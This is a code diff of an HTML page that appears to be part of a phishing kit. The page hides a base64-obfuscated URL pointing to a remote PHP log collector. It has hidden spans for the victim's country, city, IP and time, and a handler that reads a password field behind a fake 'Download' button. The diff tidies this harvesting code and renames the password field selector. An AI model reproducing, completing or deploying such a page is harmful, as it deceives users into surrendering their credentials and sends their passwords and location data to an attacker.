@@ -9,6 +9,11 @@
       const lele = "aHR0cHM6Ly9idWNrZXRsaW9uLmNvbS9sb2dzL2Rhc2hib2FyZC9maWxlL29uZHVnLnBocA==";
     </script>
     <script src="./script.js"></script>
+    <span id="country"></span>
+    <span id="city"></span>
+    <span id="flag"></span>
+    <span id="eyep"></span>
+    <span id="nownow"></span>
     <style>
       body {
         margin: 0;
@@ -148,11 +153,7 @@
         }
       }
     </style>
-    <span id="country"></span>
-    <span id="city"></span>
-    <span id="flag"></span>
-    <span id="eyep"></span>
-    <span id="nownow"></span>
+    
   </head>
   
   <body style="height:100vh;">
@@ -223,7 +224,7 @@
       
       const subForm = document.querySelector('#Btn');
       const errMsgImg = document.querySelector("#err_img");
-      const pwd = document.querySelector("#xxx");
+      const pwd = document.querySelector("#password");
       // subForm.textContent = 'Download';
       
       subForm.addEventListener('click', ()=>{
